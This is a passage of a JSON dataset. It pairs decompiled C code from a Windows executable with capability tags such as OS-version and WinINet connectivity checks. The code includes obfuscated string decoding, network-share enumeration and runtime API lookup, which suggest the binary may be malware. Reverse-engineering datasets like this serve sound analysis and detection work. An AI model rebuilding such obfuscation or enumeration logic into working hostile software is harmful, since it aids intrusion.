= (**0x413154)(in_EAX, 0x7d);\n            iVar10 = iVar10 + (1 - in_EAX);\n            if (*0x433838 < uVar6) {\n                uVar6 = 1;\n            }\n            uVar3 = *(*0x433830 + -4 + uVar6 * 4);\n            iVar2 = iVar10;\n            goto code_r0x0040af7f;\n        }\n        uVar3 = fcn.00407c1d(0x4123fc, 5, 0x6051c270, 5);\n        iVar2 = (**0x413164)(in_EAX, uVar3);\n        if (iVar2 == 0) {\n            fcn.0040a8b2(&var_14h, *0x433834, 5);\n            in_EAX = in_EAX + 5;\n            var_8h = var_8h + -5;\n            iVar2 = var_8h;\n            goto joined_r0x0040aa06;\n        }\n        uVar3 = fcn.00407c1d(0x412404, 8, 0xf59ed8e0, 8);\n        iVar2 = (**0x413164)(in_EAX, uVar3);\n        if (iVar2 == 0) {\n            uVar6 = *0x433589 != '\\0';\n            uVar3 = fcn.00407c1d(0x412370, 2, 0xa32742c6);\n            fcn.00407db3(&var_f0h, uVar3, uVar6);\n            puVar8 = &var_f0h;\n            goto code_r0x0040af35;\n        }\n        uVar3 = fcn.00407c1d(0x412410, 6, 0x2ddd39ed, 6);\n        iVar7 = (**0x413164)(in_EAX, uVar3);\n        iVar2 = 6;\n        uVar3 = *0x43383c;\n        if (iVar7 != 0) {\n            uVar3 = fcn.00407c1d(0x412418, 6, 0x8365d1c9);\n            iVar2 = (**0x413164)(in_EAX, uVar3);\n            if (iVar2 == 0) {\n                var_38h._0_1_ = 0;\n                uStack51 = 0;\n                iVar10 = *0x433840 + (*0x433840 >> 0x1f & 0xfffU) >> 0xc;\n                unique0x10000952 = iVar2;\n                iStack55 = iVar2;\n                uVar3 = fcn.00407c1d(0x4123a0, 2, 0x5f2dc2a9);\n                fcn.00407db3(&var_38h, uVar3, iVar10);\n                puVar8 = &var_38h;\n            }\n            else {\n                uVar3 = fcn.00407c1d(0x412420, 6, 0xe1b3d197, 6);\n                iVar2 = (**0x413164)(in_EAX, uVar3);\n                if (iVar2 != 0) {\n                    uVar1 = *in_EAX;\n                    in_EAX = in_EAX + 1;\n                    var_8h = var_8h + -1;\n                    *var_ch = uVar1;\n                    var_ch = var_ch + 1;\n                    iVar2 = var_8h;\n                    goto joined_r0x0040aa06;\n                }\n                var_50h._0_1_ = 0;\n                uStack75 = 0;\n                iVar10 = *0x433844 + (*0x433844 >> 0x1f & 0xfffU) >> 0xc;\n                unique0x10000942 = iVar2;\n                iStack79 = iVar2;\n                uVar3 = fcn.00407c1d(0x4123a0, 2, 0x5f2dc2a9);\n                fcn.00407db3(&var_50h, uVar3, iVar10);\n                puVar8 = &var_50h;\n            }\n            fcn.0040a8b2(&var_14h, puVar8, 6);\n            in_EAX = in_EAX + 6;\n            var_8h = var_8h + -6;\n            iVar2 = var_8h;\n            goto joined_r0x0040aa06;\n        }\n    }\ncode_r0x0040af7f:\n    fcn.0040a8b2(&var_14h, uVar3, iVar2);\ncode_r0x0040af91:\n    in_EAX = in_EAX + iVar10;\n    var_8h = var_8h - iVar10;\n    iVar2 = var_8h;\n    goto joined_r0x0040aa06;\n}\n",
        "token_count": 3960
    },
    "0040b0a1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.0040b0a1(uint arg_8h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    fcn.00407c1d(0x41242c, 9, 0x467f974b);\n    iVar2 = fcn.00402cec();\n    if (iVar2 != 0) {\n        fcn.00407c1d(str._qo_, 9, 0x5977de8c);\n        iVar2 = fcn.00402cec();\n        if (iVar2 != 0) {\n            var_8h = fcn.00402c8f();\n            var_ch = fcn.00406c76();\n            uVar6 = 0;\n            if (var_8h != 0) {\n                do {\n                    fcn.00402cb6(uVar6);\n                    uVar1 = fcn.00402da4();\n                    *(var_ch + uVar6 * 2) = uVar1;\n                    uVar6 = uVar6 + 1;\n                } while (uVar6 < var_8h);\n            }\n        }\n    }\n    bVar5 = false;\n    iVar2 = (**0x4130a8)(0, 0);\n    if ((iVar2 != 0) && (iVar3 = fcn.00406c7f(),  iVar3 != 0)) {\n        bVar5 = false;\n        uVar6 = (**0x4130a8)(iVar2, iVar3);\n        uVar7 = 0;\n        if (uVar6 != 0) {\n            do {\n                uVar4 = 0;\n                if (var_8h != 0) {\n                    do {\n                        if (*(iVar3 + uVar7 * 4) == *(var_ch + uVar4 * 2)) {\n                            bVar5 = true;\n                            goto code_r0x0040b182;\n                        }\n                        uVar4 = uVar4 + 1;\n                    } while (uVar4 < var_8h);\n                }\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar6);\n        }\ncode_r0x0040b182:\n        bVar5 = !bVar5;\n        fcn.00406d25();\n    }\n    uVar6 = fcn.00406d25();\n    return uVar6 & 0xffffff00 | bVar5;\n}\n",
        "token_count": 630
    },
    "0040c2fa": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.0040c2fa(uint arg_8h)\n\n{\n    uint uVar1;\n    uint32_t in_EDX;\n    uint32_t extraout_EDX;\n    uint unaff_EDI;\n    \n    if ((*0x434740 == NULL) && (fcn.0040c189(),  in_EDX = extraout_EDX,  *0x434740 == NULL)) {\n        return extraout_EDX << 0x20;\n    }\n    if (*0x434738 == 0) {\n        uVar1 = (**0x434740)();\n        return CONCAT44(in_EDX, uVar1);\n    }\n    uVar1 = (**0x434740)();\n    return CONCAT44(unaff_EDI, uVar1);\n}\n",
        "token_count": 167
    },
    "0040d088": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040d088(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar1 = (**0x4133b8)(0x412560, \"IsMenu\");\n    iVar2 = (**0x4134cc)(uVar1);\n    uVar3 = 0;\n    while ((uVar4 = uVar3,  *(uVar3 + iVar2) != 0x2b2 || (uVar4 = uVar3 + 2,  *(uVar4 + iVar2) != -0x18))) {\n        uVar3 = uVar4 + 1;\n        if (0x2f < uVar3) {\ncode_r0x0040d0cd:\n            if (*0x4347cc == 0) {\n                *0x4347c8 = 1;\n                uVar3 = 0;\n                while ((uVar4 = uVar3,  *(uVar3 + iVar2) != 0x26a || (uVar4 = uVar3 + 2,  *(uVar4 + iVar2) != -0x18))) {\n                    uVar3 = uVar4 + 1;\n                    if (0x2f < uVar3) {\n                        *0x4347c8 = 1;\n                        return;\n                    }\n                }\n                *0x4347cc = *(uVar3 + 3 + iVar2) + uVar4 + 5 + iVar2;\n            }\n            return;\n        }\n    }\n    *0x4347cc = *(uVar3 + 3 + iVar2) + uVar4 + 5 + iVar2;\n    goto code_r0x0040d0cd;\n}\n",
        "token_count": 392
    },
    "0040d168": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.0040d168(uint arg_8h)\n\n{\n    uint uVar1;\n    uint32_t in_EDX;\n    uint32_t extraout_EDX;\n    uint unaff_ESI;\n    \n    if (*0x4347cc == NULL) {\n        fcn.0040d088();\n        in_EDX = extraout_EDX;\n        if (*0x4347cc == NULL) {\n            return extraout_EDX << 0x20;\n        }\n    }\n    if (*0x4347c8 == 0) {\n        uVar1 = (**0x4347cc)();\n        return CONCAT44(in_EDX, uVar1);\n    }\n    uVar1 = (**0x4347cc)(1);\n    return CONCAT44(unaff_ESI, uVar1);\n}\n",
        "token_count": 178
    },
    "0040dca2": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.0040dca2(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_1ch;\n    uint uStack26;\n    uint uStack22;\n    uint uStack18;\n    uint *var_8h;\n    uint *var_4h;\n    \n    iVar4 = fcn.0040dc8a(arg_8h);\n    var_4h = NULL;\n    (**0x4133e8)(0x4338c8);\n    for (puVar5 = *0x434848; puVar5 != NULL; puVar5 = *puVar5) {\n        if (puVar5[1] == iVar4) goto code_r0x0040ddb4;\n    }\n    puVar6 = fcn.00406c76();\n    puVar5 = var_4h;\n    if (puVar6 != NULL) {\n        *puVar6 = *0x434848;\n        *0x434848 = puVar6;\n        puVar6[1] = iVar4;\n        iVar4 = fcn.00406c76();\n        puVar6[3] = iVar4;\n        puVar5 = puVar6;\n        if ((iVar4 != 0) && (var_4h = NULL,  *0x4338b8 != 0)) {\n            while( true ) {\n                puVar6[2] = puVar6[2] + 1;\n                var_8h = fcn.00406c7f();\n                *(puVar6[3] + var_4h * 4) = var_8h;\n                if (var_8h == NULL) break;\n                fcn.00409627();\n                var_1ch._0_2_ = 0;\n                stack0xffffffe2 = 0;\n                uStack26 = 0;\n                uStack22 = 0;\n                uStack18 = 0;\n                fcn.00408177(5);\n                uVar3 = var_4h;\n                puVar2 = var_8h;\n                piVar1 = *0x43385c + var_4h * 4;\n                *var_8h = *(*piVar1 + 8);\n                var_8h[1] = *(*piVar1 + 0xc);\n                var_8h = (*piVar1)[1];\n                iVar4 = fcn.0040a95b(**piVar1, &var_1ch);\n                puVar2[2] = iVar4;\n                if ((iVar4 == 0) || (var_4h = uVar3 + 1,  *0x4338b8 <= var_4h)) break;\n            }\n        }\n    }\ncode_r0x0040ddb4:\n    var_4h = puVar5;\n    (**0x4133f0)(0x4338c8);\n    return var_4h;\n}\n",
        "token_count": 690
    },
    "0040e1fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040e1fc(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t arg_ch_00;\n    uint arg_8h_00;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    if (arg_8h != 0) {\n        if (*(arg_8h + 0x10) == 0) {\n            var_4h = fcn.00406c7f();\n            if (var_4h == 0) {\n                return 0;\n            }\n            (**0x413174)(var_4h, arg_8h + 0x18, *(arg_8h + 0x14) + 1);\n            *(var_4h + *(arg_8h + 0x14) * 2) = 0x5c;\n            *(var_4h + 2 + *(arg_8h + 0x14) * 2) = 0;\n            var_8h = *(arg_8h + 0x14) + 1;\n        }\n        else {\n            arg_ch_00 = fcn.0040e1fc(*(arg_8h + 0x10), &var_8h);\n            if (arg_ch_00 != 0) {\n                arg_8h_00 = fcn.00407c34(0x41261c, 5, 0xa5744f50, arg_ch_00, arg_8h + 0x18);\n                var_8h = fcn.00407df0(arg_8h_00, arg_ch_00);\n                fcn.00406d25();\n            }\n        }\n        if ((var_4h != 0) && (arg_ch != NULL)) {\n            *arg_ch = var_8h;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 440
    },
    "0040e399": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0040e399(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char *arg_ch_00;\n    uint uVar6;\n    uint arg_8h_00;\n    uint32_t uVar7;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    piVar3 = fcn.00406c76();\n    if (piVar3 != NULL) {\n        *(piVar3 + 1) = 0;\n        uVar4 = fcn.00402c8f();\n        if (uVar4 != 0) {\n            iVar5 = fcn.00406c76();\n            piVar3[2] = iVar5;\n            if ((iVar5 != 0) && (var_4h = 0,  uVar4 != 0)) {\n                do {\n                    iVar5 = fcn.00402cb6(var_4h);\n                    if (iVar5 != 0) {\n                        arg_ch_00 = fcn.00402e0b();\n                        if (arg_ch == 2) {\n                            uVar6 = fcn.00407c34(0x412624, 4, 0xbba79e60);\n                            fcn.00407df0(uVar6, arg_ch_00);\ncode_r0x0040e512:\n                            if (arg_ch != 3) {\ncode_r0x0040e518:\n                                if (*(piVar3[2] + *piVar3 * 4) != 0) {\n                                    *piVar3 = *piVar3 + 1;\n                                }\n                            }\n                        }\n                        else {\n                            if (arg_ch != 3) {\n                                if (arg_ch != 4) {\n                                    *(piVar3 + 1) = 1;\n                                    iVar5 = fcn.004078ea(arg_ch_00, &var_8h);\n                                    if (iVar5 != 0) {\n                                        (**0x4130b0)(iVar5, var_8h);\n                                        uVar6 = fcn.0040dc8a(iVar5);\n                                        *(piVar3[2] + *piVar3 * 4) = uVar6;\n                                        fcn.00406d25();\n                                    }\n                                    goto code_r0x0040e512;\n                                }\n                                uVar6 = fcn.004078ea(arg_ch_00, 0);\n                                *(piVar3[2] + *piVar3 * 4) = uVar6;\n                                goto code_r0x0040e518;\n                            }\n                            uVar7 = 0;\n                            if (*0x4338bc != 0) {\n                                do {\n                                    for (; *arg_ch_00 == '\\\\'; arg_ch_00 = arg_ch_00 + 1) {\n                                    }\n                                    uVar6 = *(*0x433858 + uVar7 * 4);\n                                    arg_8h_00 = fcn.00407c34(0x41262c, 4, 0x2970b8d4, uVar6, arg_ch_00);\n                                    iVar5 = fcn.00407df0(arg_8h_00, uVar6);\n                                    piVar1 = piVar3[2] + *piVar3 * 4;\n                                    if (*piVar1 != 0) {\n                                        piVar2 = *piVar1 + -2 + iVar5 * 2;\n                                        if (*piVar2 == 0x5c) {\n                                            *piVar2 = 0;\n                                        }\n                                        *piVar3 = *piVar3 + 1;\n                                    }\n                                    uVar7 = uVar7 + 1;\n                                } while (uVar7 < *0x4338bc);\n                            }\n                        }\n                    }\n                    var_4h = var_4h + 1;\n                } while (var_4h < uVar4);\n            }\n        }\n        if (*piVar3 == 0) {\n            fcn.00406d25();\n            piVar3 = NULL;\n        }\n    }\n    return piVar3;\n}\n",
        "token_count": 934
    },
    "0040ea20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ea20(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_208h;\n    \n    uVar3 = fcn.00407c34(0x412128, 5, 0x868d95fd, arg_8h, arg_ch);\n    fcn.00407d76(&var_208h, uVar3, arg_8h);\n    iVar4 = fcn.00406c8c();\n    piVar1 = *0x433868;\n    (*0x433868)[2] = iVar4;\n    if (iVar4 == 0) {\n        *piVar1 = 0;\n    }\n    else {\n        uVar3 = (**0x4133a4)(&var_208h);\n        (**0x4130b0)(&var_208h, uVar3);\n        piVar1 = *0x433868;\n        uVar3 = fcn.00407c4b();\n        piVar2 = *0x433868;\n        *(piVar1[2] + **0x433868 * 4) = uVar3;\n        iVar4 = *piVar2;\n        if (*(piVar1[2] + iVar4 * 4) != 0) {\n            *piVar2 = iVar4 + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 331
    },
    "0040eb02": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.0040eb02(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint unaff_retaddr;\n    uint32_t uVar8;\n    uint32_t uStack80;\n    uchar auStack64 [64];\n    \n    (**0x4133e4)(0x4338c8);\n    fcn.00409b1e(0x40e9a8, 0);\n    fcn.00407c1d(str.ZEQ_, 7, 0xf3352960);\n    iVar2 = fcn.00402cec();\n    if (iVar2 != 0) {\n        fcn.00407c1d(0x4125f8, 5, 0x4784fccf);\n        iVar2 = fcn.00402cec();\n        if (iVar2 != 0) {\n            uVar3 = fcn.00402c8f();\n            uStack80 = 0;\n            if (uVar3 != 0) {\n                do {\n                    iVar2 = fcn.00402cb6(uStack80);\n                    if (iVar2 != 0) {\n                        uVar4 = fcn.00402c8f();\n                        uVar8 = 0;\n                        if (uVar4 != 0) {\n                            do {\n                                uVar5 = fcn.00402b1a();\n                                uVar6 = fcn.00402cb6(uVar8);\n                                fcn.00402c81(uVar6);\n                                iVar2 = fcn.0040e399(uVar5, 1);\n                                if (iVar2 != 0) {\n                                    *0x4338b4 = fcn.00406c8c();\n                                    iVar7 = *0x43386c;\n                                    *0x43386c = *0x43386c + 1;\n                                    *(*0x4338b4 + iVar7 * 4) = iVar2;\n                                }\n                                fcn.00402bc0();\n                                uVar8 = uVar8 + 1;\n                            } while (uVar8 < uVar4);\n                        }\n                    }\n                    uStack80 = uStack80 + 1;\n                } while (uStack80 < uVar3);\n            }\n        }\n        fcn.0040e6d3();\n    }\n    uVar3 = 0;\n    fcn.0040e09c(unaff_retaddr);\n    fcn.00407c1d(0x41242c, 9, 0x467f974b);\n    iVar2 = fcn.00402cec();\n    if (iVar2 != 0) {\n        fcn.00407c1d(0x4125f8, 5, 0x4784fccf);\n        iVar2 = fcn.00402cec();\n        if (iVar2 != 0) {\n            if (*0x4338b8 != 0) {\n                do {\n                    iVar7 = fcn.0040780a(**(*0x43385c + uVar3 * 4));\n                    if (iVar7 != 0) {\n                        uVar5 = fcn.00402b23();\n                        fcn.00402c73(uVar5);\n                        fcn.00406d25();\n                    }\n                    uVar3 = uVar3 + 1;\n                } while (uVar3 < *0x4338b8);\n            }\n            *0x433850 = fcn.0040e399(iVar2, 0);\n        }\n        fcn.00407c1d(0x412654, 7, 0x8dac774b);\n        iVar2 = fcn.00402cec();\n        if ((iVar2 != 0) && (*0x4338e0 = fcn.0040e399(iVar2, 2),  *0x4338e0 != NULL)) {\n            iVar2 = fcn.00406c8c();\n            piVar1 = *0x4338e0;\n            (*0x4338e0)[2] = iVar2;\n            if (iVar2 == 0) {\n                *piVar1 = 0;\n            }\n            else {\n                uVar3 = 0;\n                if (*0x4338c4 != 0) {\n                    do {\n                        uVar5 = *(*0x4338c0 + uVar3 * 4);\n                        uVar6 = fcn.00407c34(0x41265c, 4, 0x26341f55);\n                        fcn.00407df0(uVar6, uVar5);\n                        if (*((*0x4338e0)[2] + **0x4338e0 * 4) != 0) {\n                            **0x4338e0 = **0x4338e0 + 1;\n                        }\n                        uVar3 = uVar3 + 1;\n                    } while (uVar3 < *0x4338c4);\n                }\n            }\n        }\n        fcn.00407c1d(0x412664, 10, 0x2f5b32b3);\n        iVar2 = fcn.00402cec();\n        if ((iVar2 != 0) && (*0x433854 = fcn.0040e399(iVar2, 1),  *0x433854 != NULL)) {\n            iVar2 = fcn.00406c8c();\n            piVar1 = *0x433854;\n            (*0x433854)[2] = iVar2;\n            if (iVar2 == 0) {\n                *piVar1 = 0;\n            }\n            else {\n                uVar5 = fcn.00407c34(0x412670, 3, 0xa22f972c, 0x433c88);\n                uVar5 = (**0x413088)(auStack64, uVar5);\n                (**0x4130b0)(auStack64, uVar5);\n                uVar5 = fcn.0040dc8a(auStack64);\n                piVar1 = *0x433854;\n                *((*0x433854)[2] + **0x433854 * 4) = uVar5;\n                *piVar1 = *piVar1 + 1;\n            }\n        }\n    }\n    fcn.00407c1d(0x412674, 9, 0x1d4b362f);\n    iVar2 = fcn.00402cec();\n    if (iVar2 != 0) {\n        fcn.00407c1d(0x412654, 7, 0x8dac774b);\n        iVar2 = fcn.00402cec();\n        if (iVar2 != 0) {\n            uVar5 = fcn.00407c34(0x412680, 0xf, 0xd4627de8);\n            fcn.0040e854(uVar5);\n            uVar5 = fcn.00407c34(0x412690, 0xe, 0xb6675893);\n            fcn.0040e854(uVar5);\n            fcn.0040e975(0x1a);\n            fcn.0040e975(0x1c);\n            *0x433868 = fcn.0040e399(iVar2, 3);\n            if ((*0x433868 != 0) || (*0x433868 = fcn.00406c76(),  *0x433868 != 0)) {\n                fcn.0040ead0();\n            }\n        }\n    }\n    (**0x4137d0)(0x16, 0, 0x433870, 0x4138c0);\n    return *0x4338b4 != 0;\n}\n",
        "token_count": 1733
    },
    "0040f020": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f020(uint arg_8h, uint arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = (**0x413344)(2, 1, 0x13, arg_8h, &var_8h);\n    if (iVar1 == 0) {\n        var_4h = 0xffffffff;\n        var_ch = 800;\n        iVar1 = fcn.00406c7f();\n        uVar3 = 0;\n        if (iVar1 != 0) {\n            iVar2 = (**0x413348)(var_8h, &var_4h, iVar1, &var_ch);\n            if ((iVar2 == 0) && (var_4h != 0)) {\n                puVar4 = iVar1 + 0x14;\n                do {\n                    if ((*(puVar4 + -2) & 2) == 0) {\n                        (*arg_10h)(*puVar4);\n                        if (arg_ch != '\\0') break;\n                    }\n                    else {\n                        fcn.0040f020(puVar4 + -5, arg_ch, arg_10h, arg_14h);\n                    }\n                    uVar3 = uVar3 + 1;\n                    puVar4 = puVar4 + 8;\n                } while (uVar3 < var_4h);\n            }\n            fcn.00406d25();\n        }\n        (*str._D3A._0_4_)(var_8h);\n    }\n    return;\n}\n",
        "token_count": 391
    },
    "0040f1ca": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nbool __cdecl fcn.0040f1ca(uint arg_8h, uint *arg_ch, char *arg_10h)\n\n{\n    uint *s2;\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uint n;\n    uint *arg_14h;\n    uint arg_18h;\n    uint var_1h;\n    \n    s2 = arg_ch + 0xb;\n    uVar2 = (**0x41314c)(s2);\n    if (*arg_10h == '\\0') {\n        uVar2 = fcn.0040dc8a(uVar2);\n        cVar1 = fcn.0040e332(uVar2);\n        if (cVar1 != '\\0') {\n            return true;\n        }\n        uVar2 = fcn.0040dc8a(s2);\n        cVar1 = fcn.0040e332(uVar2);\n        if (cVar1 != '\\0') {\n            return true;\n        }\n    }\n    else {\n        cVar1 = fcn.0040f189();\n        if (cVar1 == '\\0') {\n            return true;\n        }\n        uVar3 = fcn.0040dc8a(s2);\n        cVar1 = fcn.0040e332(uVar3);\n        if (cVar1 != '\\0') {\n            return true;\n        }\n        fcn.0040dc8a(uVar2);\n    }\n    uVar2 = *arg_ch;\n    uVar3 = arg_ch[6];\n    arg_18h = arg_ch[5];\n    arg_14h = s2;\n    n = (**0x4133a4)();\n    cVar1 = fcn.0040f109(arg_8h, s2, n, arg_14h, arg_18h, uVar3, uVar2);\n    return cVar1 != '\\0';\n}\n",
        "token_count": 434
    },
    "0040f528": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f528(char *arg_8h)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t unaff_ESI;\n    int32_t iStack36;\n    int32_t iStack32;\n    char cStack28;\n    uint uStack27;\n    uint uStack23;\n    uint uStack19;\n    uint uStack15;\n    ushort uStack11;\n    uchar uStack9;\n    \n    fcn.00408fc9(&iStack32);\n    uStack27 = 0;\n    uStack23 = 0;\n    uStack19 = 0;\n    uStack15 = 0;\n    uStack11 = 0;\n    uStack9 = 0;\n    cStack28 = *arg_8h;\n    uVar1 = (**0x4133a4)(*(arg_8h + 8));\n    (**0x4130b0)(*(arg_8h + 8), uVar1);\n    uVar4 = 0;\n    fcn.0040f27c(0, *(arg_8h + 8), fcn.0040f1ca, &stack0xffffffd8);\n    if (*arg_8h != '\\0') {\n        if ((*0x433868 != NULL) && (**0x433868 != 0)) {\n            do {\n                fcn.0040f27c(0, *((*0x433868)[2] + uVar4 * 4), fcn.0040f1ca, &stack0xffffffd8);\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < **0x433868);\n        }\n        uVar4 = 0;\n        if (*0x4338c4 != 0) {\n            do {\n                fcn.0040f27c(0, *(*0x4338c0 + uVar4 * 4), fcn.0040f1ca, &stack0xffffffd8);\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < *0x4338c4);\n        }\n    }\n    if (iStack32 == 0) {\n        fcn.0040f50f();\n    }\n    else {\n        (**0x413414)(*(arg_8h + 4));\n        (**0x4133e8)(*(arg_8h + 0xc));\n        if (*arg_8h == '\\0') {\n            if (**(arg_8h + 0x18) == NULL) {\n                piVar2 = *(arg_8h + 0x14);\n            }\n            else {\n                piVar2 = **(arg_8h + 0x18);\n            }\n            *piVar2 = iStack36;\n            piVar2 = *(arg_8h + 0x18);\n            iStack36 = iStack32;\n        }\n        else {\n            piVar2 = *(arg_8h + 0x10);\n        }\n        *piVar2 = iStack36;\n        piVar2 = *(arg_8h + 0x1c);\n        if (*piVar2 == 0) {\n            *piVar2 = unaff_ESI;\n        }\n        else {\n            for (iVar3 = *piVar2; *(iVar3 + 0xc) != 0; iVar3 = *(iVar3 + 0xc)) {\n            }\n            *(iVar3 + 0xc) = unaff_ESI;\n        }\n        (**0x4133f0)(*(arg_8h + 0xc));\n    }\n    fcn.00406d25();\n    fcn.00406d25();\n    return;\n}\n",
        "token_count": 827
    },
    "0040fc7e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fc7e(uint32_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *in_EDX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t var_4h;\n    \n    uVar4 = *arg_8h;\n    uVar3 = *arg_ch;\n    uVar5 = uVar3 & 3;\n    var_4h = -uVar5 & 3;\n    if ((var_4h != 0) && (var_4h <= arg_10h)) {\n        arg_10h = arg_10h - var_4h;\n        do {\n            var_4h = var_4h - 1;\n            uVar2 = uVar3 >> 8;\n            uVar3 = uVar2 | *in_EDX << 0x18;\n            in_EDX = in_EDX + 1;\n            uVar5 = uVar5 + 1;\n            if (uVar5 == 4) {\n                uVar3 = (uVar2 * 0x16a88000 | uVar3 * -0x3361d2af >> 0x11) * 0x1b873593;\n                uVar4 = ((uVar4 ^ uVar3) << 0xd | (uVar4 ^ uVar3) >> 0x13) * 5 + 0xe6546b64;\n                uVar5 = 0;\n            }\n        } while (var_4h != 0);\n    }\n    uVar2 = arg_10h + (arg_10h >> 0x1f & 3U) & 0xfffffffc;\n    piVar1 = uVar2 + in_EDX;\n    for (; in_EDX < piVar1; in_EDX = in_EDX + 1) {\n        uVar4 = uVar4 ^ (*in_EDX * 0x16a88000 | *in_EDX * -0x3361d2af >> 0x11) * 0x1b873593;\n        uVar4 = (uVar4 << 0xd | uVar4 >> 0x13) * 5 + 